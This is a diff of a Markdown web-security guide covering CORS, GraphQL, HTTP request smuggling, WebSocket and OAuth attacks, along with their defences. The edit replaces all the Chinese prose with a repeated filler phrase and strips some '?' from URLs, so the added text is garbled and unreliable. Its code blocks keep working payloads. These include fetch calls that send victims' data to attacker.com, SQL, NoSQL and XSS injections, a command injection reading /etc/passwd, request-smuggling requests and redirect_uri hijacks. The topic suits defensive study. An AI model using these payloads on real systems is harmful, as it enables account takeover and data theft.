@@ -1,51 +1,51 @@
-# 现代Web协议安全
+# web security testing guidanceWebweb security testing guidance
 
-> **来源**: 基于WooYun漏洞库、OWASP及业界安全实践提炼，涵盖CORS、GraphQL、HTTP走私、WebSocket、OAuth五大现代Web协议攻击面。
-> **方法论**: WooYun漏洞本质公式 + L1-L4系统化分析
+> **web security testing guidance**: web security testing guidanceWooYunweb security testing guidance、OWASPweb security testing guidance，web security testing guidanceCORS、GraphQL、HTTPweb security testing guidance、WebSocket、OAuthweb security testing guidanceWebweb security testing guidance。
+> **web security testing guidance**: WooYunweb security testing guidance + L1-L4web security testing guidance
 
 ---
 
-## 一、CORS错误配置
+## web security testing guidance、CORSweb security testing guidance
 
-### 1.1 漏洞本质
+### 1.1 web security testing guidance
 
 ```
-CORS风险 = Access-Control-Allow-Origin配置过宽 × 敏感接口缺乏额外鉴权
+CORSweb security testing guidance = Access-Control-Allow-Originweb security testing guidance × web security testing guidance
 ```
 
-浏览器同源策略本是安全屏障，CORS错误配置将其打破，允许恶意站点跨域读取用户敏感数据。
+web security testing guidance，CORSweb security testing guidance，web security testing guidance。
 
-### 1.2 检测方法
+### 1.2 web security testing guidance
 
 ```bash
-# 基础检测: 发送自定义Origin观察响应
+# web security testing guidance: web security testing guidanceOriginweb security testing guidance
 curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
-# 检查响应头:
-# Access-Control-Allow-Origin: https://evil.com  → 危险!
-# Access-Control-Allow-Credentials: true          → 可携带Cookie跨域请求
+# web security testing guidance:
+# Access-Control-Allow-Origin: https://evil.com  → web security testing guidance!
+# Access-Control-Allow-Credentials: true          → web security testing guidanceCookieweb security testing guidance
 ```
 
-**危险配置模式**
+**web security testing guidance**
 
-| 模式 | 风险 | 说明 |
+| web security testing guidance | web security testing guidance | web security testing guidance |
 |------|------|------|
-| `Access-Control-Allow-Origin: *` | 高 | 通配符，任意域可读取(但不可带Cookie) |
-| 动态反射Origin | 极高 | 将请求Origin直接作为响应头返回 |
-| `null` Origin允许 | 高 | `<iframe sandbox>`可构造null来源 |
-| 正则匹配缺陷 | 高 | `evil.com.attacker.com`匹配`evil.com` |
-| 子域通配 | 中 | `*.target.com`含已失控的子域 |
+| `Access-Control-Allow-Origin: *` | web security testing guidance | web security testing guidance，web security testing guidance(web security testing guidanceCookie) |
+| web security testing guidanceOrigin | web security testing guidance | web security testing guidanceOriginweb security testing guidance |
+| `null` Originweb security testing guidance | web security testing guidance | `<iframe sandbox>`web security testing guidancenullweb security testing guidance |
+| web security testing guidance | web security testing guidance | `evil.com.attacker.com`web security testing guidance`evil.com` |
+| web security testing guidance | web security testing guidance | `*.target.com`web security testing guidance |
 
-### 1.3 利用方式
+### 1.3 web security testing guidance
 
 ```html
-<!-- 恶意页面: 跨域窃取用户数据 -->
+<!-- web security testing guidance: web security testing guidance -->
 <script>
 fetch('https://target.com/api/userinfo', {credentials: 'include'})
   .then(r => r.json())
-  .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)));
+  .then(d => fetch('https://attacker.com/steal data=' + JSON.stringify(d)));
 </script>
 
-<!-- null Origin利用 -->
+<!-- null Originweb security testing guidance -->
 <iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
 <script>
 fetch('https://target.com/api/userinfo',{credentials:'include'})
@@ -54,105 +54,105 @@ fetch('https://target.com/api/userinfo',{credentials:'include'})
 </iframe>
 ```
 
-### 1.4 防御措施
+### 1.4 web security testing guidance
 
-- **严格白名单校验Origin**：不要动态反射，使用精确匹配列表
-- 避免`Access-Control-Allow-Origin: *`与`Access-Control-Allow-Credentials: true`同时使用
-- 避免允许`null` Origin
-- 正则匹配必须锚定(^和$)，防止子串匹配绕过
-- 敏感接口增加CSRF Token等额外鉴权，不仅依赖CORS
+- **web security testing guidanceOrigin**：web security testing guidance，web security testing guidance
+- web security testing guidance`Access-Control-Allow-Origin: *`web security testing guidance`Access-Control-Allow-Credentials: true`web security testing guidance
+- web security testing guidance`null` Origin
+- web security testing guidance(^web security testing guidance$)，web security testing guidance
+- web security testing guidanceCSRF Tokenweb security testing guidance，web security testing guidanceCORS
 
 ---
 
-## 二、GraphQL安全
+## web security testing guidance、GraphQLweb security testing guidance
 
-### 2.1 漏洞本质
+### 2.1 web security testing guidance
 
 ```
-GraphQL风险 = 强大的查询能力 × 默认开放的内省机制 × 缺乏细粒度鉴权
+GraphQLweb security testing guidance = web security testing guidance × web security testing guidance × web security testing guidance
 ```
 
-GraphQL单一端点暴露全部数据模型，内省机制提供完整API文档，攻击者无需猜测接口。
+GraphQLweb security testing guidance，web security testing guidanceAPIweb security testing guidance，web security testing guidance。
 
-### 2.2 内省查询 - 信息泄露
+### 2.2 web security testing guidance - web security testing guidance
 
 ```graphql
-# 获取完整Schema（类型、字段、参数）
+# web security testing guidanceSchema（web security testing guidance、web security testing guidance、web security testing guidance）
 {__schema{types{name,fields{name,args{name,type{name}}}}}}
 
-# 精简版：仅获取查询类型
+# web security testing guidance：web security testing guidance
 {__schema{queryType{name,fields{name}}}}
 
-# 获取mutation列表
+# web security testing guidancemutationweb security testing guidance
 {__schema{mutationType{name,fields{name,args{name}}}}}
 ```
 
-### 2.3 常见攻击向量
+### 2.3 web security testing guidance
 
-**注入攻击**
+**web security testing guidance**
 
 ```graphql
-# 参数拼接导致SQL注入
+# web security testing guidanceSQLweb security testing guidance
 { user(name: "admin' OR '1'='1") { id email } }
 
-# NoSQL注入
+# NoSQLweb security testing guidance
 { user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
 ```
 
-**批量查询DoS（嵌套查询耗尽资源）**
+**web security testing guidanceDoS（web security testing guidance）**
 
 ```graphql
-# 深度嵌套 - 指数级数据库查询
+# web security testing guidance - web security testing guidance
 { user(id:1) { friends { friends { friends { friends { name } } } } } }
 
-# 别名批量查询 - 单次请求枚举大量数据
+# web security testing guidance - web security testing guidance
 { a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }
 
-# 批量mutation暴力破解
+# web security testing guidancemutationweb security testing guidance
 mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
 ```
 
-**认证绕过**
+**web security testing guidance**
 
 ```graphql
-# mutation缺少鉴权检查
+# mutationweb security testing guidance
 mutation { deleteUser(id: 1) { success } }
 mutation { updateRole(userId: 1, role: "admin") { success } }
 ```
 
-### 2.4 防御措施
+### 2.4 web security testing guidance
 
-- **禁用生产环境内省查询**：检查`__schema`/`__type`请求并拒绝
-- 查询深度限制(推荐最大10层)与复杂度分析
-- 速率限制与查询超时(防批量/嵌套DoS)
-- 字段级权限控制(每个resolver独立鉴权)
-- 输入参数化处理(防注入)、禁止字符串拼接构建查询
-- 使用持久化查询(Persisted Queries)，仅允许预注册的查询执行
+- **web security testing guidance**：web security testing guidance`__schema`/`__type`web security testing guidance
+- web security testing guidance(web security testing guidance10web security testing guidance)web security testing guidance
+- web security testing guidance(web security testing guidance/web security testing guidanceDoS)
+- web security testing guidance(web security testing guidanceresolverweb security testing guidance)
+- web security testing guidance(web security testing guidance)、web security testing guidance
+- web security testing guidance(Persisted Queries)，web security testing guidance
 
 ---
 
-## 三、HTTP请求走私
+## web security testing guidance、HTTPweb security testing guidance
 
-### 3.1 漏洞本质
+### 3.1 web security testing guidance
 
 ```
-前端代理(CDN/LB) 与 后端服务器 对HTTP请求边界的解析不一致
-→ 一个TCP连接中"走私"了额外的请求 → 影响其他用户的请求处理
+web security testing guidance(CDN/LB) web security testing guidance web security testing guidance web security testing guidanceHTTPweb security testing guidance
+→ web security testing guidanceTCPweb security testing guidance"web security testing guidance"web security testing guidance → web security testing guidance
 ```
 
-核心矛盾：`Content-Length`(CL) 与 `Transfer-Encoding: chunked`(TE) 同时存在时，前后端选择不同的头部进行解析。
+web security testing guidance：`Content-Length`(CL) web security testing guidance `Transfer-Encoding: chunked`(TE) web security testing guidance，web security testing guidance。
 
-### 3.2 三种攻击类型
+### 3.2 web security testing guidance
 
-| 类型 | 前端解析 | 后端解析 | 说明 |
+| web security testing guidance | web security testing guidance | web security testing guidance | web security testing guidance |
 |------|----------|----------|------|
-| CL.TE | Content-Length | Transfer-Encoding | 前端按CL转发，后端按TE解析 |
-| TE.CL | Transfer-Encoding | Content-Length | 前端按TE转发，后端按CL解析 |
-| TE.TE | Transfer-Encoding | Transfer-Encoding | 混淆TE头使一方忽略 |
+| CL.TE | Content-Length | Transfer-Encoding | web security testing guidanceCLweb security testing guidance，web security testing guidanceTEweb security testing guidance |
+| TE.CL | Transfer-Encoding | Content-Length | web security testing guidanceTEweb security testing guidance，web security testing guidanceCLweb security testing guidance |
+| TE.TE | Transfer-Encoding | Transfer-Encoding | web security testing guidanceTEweb security testing guidance |
 
-### 3.3 经典Payload
+### 3.3 web security testing guidancePayload
 
-**CL.TE走私**
+**CL.TEweb security testing guidance**
 
 ```http
 POST / HTTP/1.1
@@ -165,7 +165,7 @@ Transfer-Encoding: chunked
 SMUGGLED
 ```
 
-**TE.CL走私**
+**TE.CLweb security testing guidance**
 
 ```http
 POST / HTTP/1.1
@@ -179,7 +179,7 @@ SMUGGLED
 
 ```
 
-**TE.TE混淆变体**
+**TE.TEweb security testing guidance**
 
 ```http
 Transfer-Encoding: chunked
@@ -190,159 +190,159 @@ Transfer-Encoding: identity
 Transfer-Encoding:chunked
 ```
 
-### 3.4 检测与利用
+### 3.4 web security testing guidance
 
 ```
-检测方法:
-1. 发送CL/TE冲突请求，观察超时/响应异常
-2. 走私一个不完整请求，看后续请求是否受影响
-3. 工具: Burp Suite HTTP Request Smuggler扩展
+web security testing guidance:
+1. web security testing guidanceCL/TEweb security testing guidance，web security testing guidance/web security testing guidance
+2. web security testing guidance，web security testing guidance
+3. web security testing guidance: Burp Suite HTTP Request Smugglerweb security testing guidance
 
-利用场景:
-- 绕过前端WAF/ACL → 走私恶意请求到后端
-- 劫持其他用户请求 → 窃取Cookie/Session
-- 缓存投毒 → 走私请求污染CDN缓存内容
-- 请求路由劫持 → 将请求导向任意后端
+web security testing guidance:
+- web security testing guidanceWAF/ACL → web security testing guidance
+- web security testing guidance → web security testing guidanceCookie/Session
+- web security testing guidance → web security testing guidanceCDNweb security testing guidance
+- web security testing guidance → web security testing guidance
 ```
 
-### 3.5 防御措施
+### 3.5 web security testing guidance
 
-- 前后端使用统一的HTTP解析库/版本
-- 禁止同时出现CL和TE头，拒绝模糊请求
-- 禁用HTTP/1.0 Keep-Alive后端连接复用
-- 升级到HTTP/2(二进制帧协议，天然免疫CL/TE歧义)
-- CDN/LB配置规范化请求头后再转发
+- web security testing guidanceHTTPweb security testing guidance/web security testing guidance
+- web security testing guidanceCLweb security testing guidanceTEweb security testing guidance，web security testing guidance
+- web security testing guidanceHTTP/1.0 Keep-Aliveweb security testing guidance
+- web security testing guidanceHTTP/2(web security testing guidance，web security testing guidanceCL/TEweb security testing guidance)
+- CDN/LBweb security testing guidance
 
 ---
 
-## 四、WebSocket安全
+## web security testing guidance、WebSocketweb security testing guidance
 
-### 4.1 漏洞本质
+### 4.1 web security testing guidance
 
 ```
-WebSocket风险 = HTTP握手后脱离传统安全模型 × 持久双向通道缺乏逐消息鉴权
+WebSocketweb security testing guidance = HTTPweb security testing guidance × web security testing guidance
 ```
 
-WebSocket连接一旦建立，后续消息不再经过标准HTTP安全机制(Cookie SameSite/CSRF Token等)。
+WebSocketweb security testing guidance，web security testing guidanceHTTPweb security testing guidance(Cookie SameSite/CSRF Tokenweb security testing guidance)。
 
-### 4.2 跨站WebSocket劫持(CSWSH)
+### 4.2 web security testing guidanceWebSocketweb security testing guidance(CSWSH)
 
 ```html
-<!-- 恶意页面: 劫持用户WebSocket连接 -->
+<!-- web security testing guidance: web security testing guidanceWebSocketweb security testing guidance -->
 <script>
 var ws = new WebSocket('wss://target.com/ws');
 ws.onopen = function() {
-    ws.send('{"action":"getPrivateData"}');  // 以受害者身份发送请求
+    ws.send('{"action":"getPrivateData"}');  // web security testing guidance
 };
 ws.onmessage = function(e) {
-    // 窃取响应数据
-    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
+    // web security testing guidance
+    fetch('https://attacker.com/steal data=' + encodeURIComponent(e.data));
 };
 </script>
 ```
 
-**原理**：WebSocket握手是标准HTTP请求，浏览器会自动携带Cookie。若服务端不验证Origin头，恶意页面可建立经过认证的ws连接。
+**web security testing guidance**：WebSocketweb security testing guidanceHTTPweb security testing guidance，web security testing guidanceCookie。web security testing guidanceOriginweb security testing guidance，web security testing guidancewsweb security testing guidance。
 
-### 4.3 消息注入
+### 4.3 web security testing guidance
 
 ```javascript
-// 通过WebSocket发送注入payload
-ws.send('{"query": "admin\' OR 1=1--"}');          // SQL注入
+// web security testing guidanceWebSocketweb security testing guidancepayload
+ws.send('{"query": "admin\' OR 1=1--"}');          // SQLweb security testing guidance
 ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
-ws.send('{"cmd": "ls; cat /etc/passwd"}');           // 命令注入
+ws.send('{"cmd": "ls; cat /etc/passwd"}');           // web security testing guidance
 ```
 
-### 4.4 认证不足
+### 4.4 web security testing guidance
 
-| 问题 | 风险 | 说明 |
+| web security testing guidance | web security testing guidance | web security testing guidance |
 |------|------|------|
-| 仅握手时认证 | Session过期后连接仍有效 | ws连接可持续数小时 |
-| 无消息级鉴权 | 任何已连接客户端可执行全部操作 | 缺乏per-message授权检查 |
-| Token明文传输 | WebSocket不加密(ws://) | 使用wss://强制加密 |
+| web security testing guidance | Sessionweb security testing guidance | wsweb security testing guidance |
+| web security testing guidance | web security testing guidance | web security testing guidanceper-messageweb security testing guidance |
+| Tokenweb security testing guidance | WebSocketweb security testing guidance(ws://) | web security testing guidancewss://web security testing guidance |
 
-### 4.5 防御措施
+### 4.5 web security testing guidance
 
-- **验证Origin头**：握手时检查Origin是否在白名单内(防CSWSH)
-- **Token鉴权**：握手时通过URL参数或首条消息传递Token(不依赖Cookie)
-- **消息校验**：对每条消息做输入验证和输出编码(防注入)
-- 使用wss://强制加密传输
-- 实现心跳机制和Session超时自动断开
-- 消息速率限制(防DoS)
+- **web security testing guidanceOriginweb security testing guidance**：web security testing guidanceOriginweb security testing guidance(web security testing guidanceCSWSH)
+- **Tokenweb security testing guidance**：web security testing guidanceURLweb security testing guidanceToken(web security testing guidanceCookie)
+- **web security testing guidance**：web security testing guidance(web security testing guidance)
+- web security testing guidancewss://web security testing guidance
+- web security testing guidanceSessionweb security testing guidance
+- web security testing guidance(web security testing guidanceDoS)
 
 ---
 
-## 五、OAuth 2.0/OIDC安全
+## web security testing guidance、OAuth 2.0/OIDCweb security testing guidance
 
-### 5.1 漏洞本质
-
-```
-OAuth风险 = 复杂的多方交互流程 × 参数校验不严格 × 实现偏离规范
-```
-
-OAuth授权流程涉及客户端、授权服务器、资源服务器三方交互，任何一环配置不当都可导致Token泄露或账户接管。
-
-### 5.2 redirect_uri操纵
+### 5.1 web security testing guidance
 
 ```
-# 正常流程
-https://auth.target.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback
-
-# 攻击: 篡改redirect_uri窃取授权码
-redirect_uri=https://attacker.com/steal           # 完全替换
-redirect_uri=https://app.com.attacker.com/callback # 子域混淆
-redirect_uri=https://app.com/callback/../../../attacker # 路径遍历
-redirect_uri=https://app.com/callback?next=https://attacker.com # 开放重定向链
+OAuthweb security testing guidance = web security testing guidance × web security testing guidance × web security testing guidance
 ```
 
-### 5.3 常见攻击向量
+OAuthweb security testing guidance、web security testing guidance、web security testing guidance，web security testing guidanceTokenweb security testing guidance。
 
-| 攻击类型 | 原理 | 利用条件 |
+### 5.2 redirect_uriweb security testing guidance
+
+```
+# web security testing guidance
+https://auth.target.com/authorize response_type=code&client_id=app&redirect_uri=https://app.com/callback
+
+# web security testing guidance: web security testing guidanceredirect_uriweb security testing guidance
+redirect_uri=https://attacker.com/steal           # web security testing guidance
+redirect_uri=https://app.com.attacker.com/callback # web security testing guidance
+redirect_uri=https://app.com/callback/../../../attacker # web security testing guidance
+redirect_uri=https://app.com/callback next=https://attacker.com # web security testing guidance
+```
+
+### 5.3 web security testing guidance
+
+| web security testing guidance | web security testing guidance | web security testing guidance |
 |----------|------|----------|
-| CSRF攻击 | state参数缺失或可预测 | 将攻击者账号绑定到受害者 |
-| Token泄露(Referer) | 隐式模式token在URL Fragment中 | 页面含外部资源引用 |
-| Token泄露(日志) | 授权码/token记录在服务端日志 | 日志可访问 |
-| PKCE绕过 | 公共客户端未使用code_challenge | 拦截授权码即可换取token |
-| IdP混淆(Mix-Up) | 多IdP场景下混淆授权响应来源 | 客户端支持多个OAuth提供商 |
-| 授权码重放 | 授权码未一次性使用 | 拦截授权码后重复兑换 |
+| CSRFweb security testing guidance | stateweb security testing guidance | web security testing guidance |
+| Tokenweb security testing guidance(Referer) | web security testing guidancetokenweb security testing guidanceURL Fragmentweb security testing guidance | web security testing guidance |
+| Tokenweb security testing guidance(web security testing guidance) | web security testing guidance/tokenweb security testing guidance | web security testing guidance |
+| PKCEweb security testing guidance | web security testing guidancecode_challenge | web security testing guidancetoken |
+| IdPweb security testing guidance(Mix-Up) | web security testing guidanceIdPweb security testing guidance | web security testing guidanceOAuthweb security testing guidance |
+| web security testing guidance | web security testing guidance | web security testing guidance |
 
-### 5.4 CSRF与state参数
-
-```
-# 攻击流程 (state缺失时)
-1. 攻击者发起OAuth授权，获取自己账号的授权码
-2. 构造链接: https://app.com/callback?code=ATTACKER_CODE
-3. 诱骗受害者点击 → 受害者账号绑定攻击者的第三方账号
-4. 攻击者用第三方账号登录 → 接管受害者账户
-
-# 防御: state参数
-state=随机不可预测值(绑定用户Session)
-→ 回调时校验state与Session匹配
-```
-
-### 5.5 隐式模式风险
+### 5.4 CSRFweb security testing guidancestateweb security testing guidance
 
 ```
-# 隐式模式(Implicit Flow) - 已不推荐
+# web security testing guidance (stateweb security testing guidance)
+1. web security testing guidanceOAuthweb security testing guidance，web security testing guidance
+2. web security testing guidance: https://app.com/callback code=ATTACKER_CODE
+3. web security testing guidance → web security testing guidance
+4. web security testing guidance → web security testing guidance
+
+# web security testing guidance: stateweb security testing guidance
+state=web security testing guidance(web security testing guidanceSession)
+→ web security testing guidancestateweb security testing guidanceSessionweb security testing guidance
+```
+
+### 5.5 web security testing guidance
+
+```
+# web security testing guidance(Implicit Flow) - web security testing guidance
 https://app.com/callback#access_token=eyJ...&token_type=bearer
 
-风险:
-- Token在URL Fragment中，可被浏览器历史/Referer头泄露
-- 无法使用refresh_token，用户体验差
-- 无法绑定客户端身份(无client_secret)
+web security testing guidance:
+- Tokenweb security testing guidanceURL Fragmentweb security testing guidance，web security testing guidance/Refererweb security testing guidance
+- web security testing guidancerefresh_token，web security testing guidance
+- web security testing guidance(web security testing guidanceclient_secret)
 
-→ 替代方案: Authorization Code Flow + PKCE
+→ web security testing guidance: Authorization Code Flow + PKCE
 ```
 
-### 5.6 防御措施
+### 5.6 web security testing guidance
 
-- **严格redirect_uri白名单**：精确匹配(不允许通配符/子路径)
-- **强制state参数**：绑定Session、不可预测、一次性使用
-- **强制PKCE**：所有客户端(尤其公共客户端/SPA)必须使用code_challenge
-- 使用Authorization Code Flow，弃用Implicit Flow
-- 授权码一次性使用，短有效期(推荐10分钟内)
-- Token绑定(DPoP/mTLS)防止Token被盗用
-- 定期审计已授权的第三方应用和权限范围
+- **web security testing guidanceredirect_uriweb security testing guidance**：web security testing guidance(web security testing guidance/web security testing guidance)
+- **web security testing guidancestateweb security testing guidance**：web security testing guidanceSession、web security testing guidance、web security testing guidance
+- **web security testing guidancePKCE**：web security testing guidance(web security testing guidance/SPA)web security testing guidancecode_challenge
+- web security testing guidanceAuthorization Code Flow，web security testing guidanceImplicit Flow
+- web security testing guidance，web security testing guidance(web security testing guidance10web security testing guidance)
+- Tokenweb security testing guidance(DPoP/mTLS)web security testing guidanceTokenweb security testing guidance
+- web security testing guidance
 
 ---
 
-*基于WooYun漏洞库(88,636条)提炼 + OWASP/RFC安全标准 | 仅供安全研究与防御参考*
+*web security testing guidanceWooYunweb security testing guidance(88,636web security testing guidance)web security testing guidance + OWASP/RFCweb security testing guidance | web security testing guidance*
